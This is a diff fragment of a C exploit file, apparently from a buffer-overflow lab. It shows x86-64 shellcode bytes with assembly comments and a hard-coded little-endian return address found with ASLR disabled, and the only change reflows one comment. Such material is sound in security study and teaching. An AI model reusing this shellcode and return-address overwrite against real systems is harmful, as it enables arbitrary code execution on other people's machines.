@@ -33,7 +33,8 @@ char short_shellcode[] = "\x48\x31\xc0"          // xor    %rax,%rax
     "\x48\x89\xe6"                               // mov    %rsp,%rsi
     "\x0f\x05";                                  // syscall
 
-// address of buffer on system found to be - 0x7fffffffdb70 (ASLR was disabled) - address changes every time a new terminal is opened
+// address of buffer on system found to be - 0x7fffffffdb70 (ASLR was disabled)
+// address changes every time a new terminal is opened
 // address is written in the Little Endian format
 char retaddr[] = "\x40\xdb\xff\xff\xff\x7f";
 
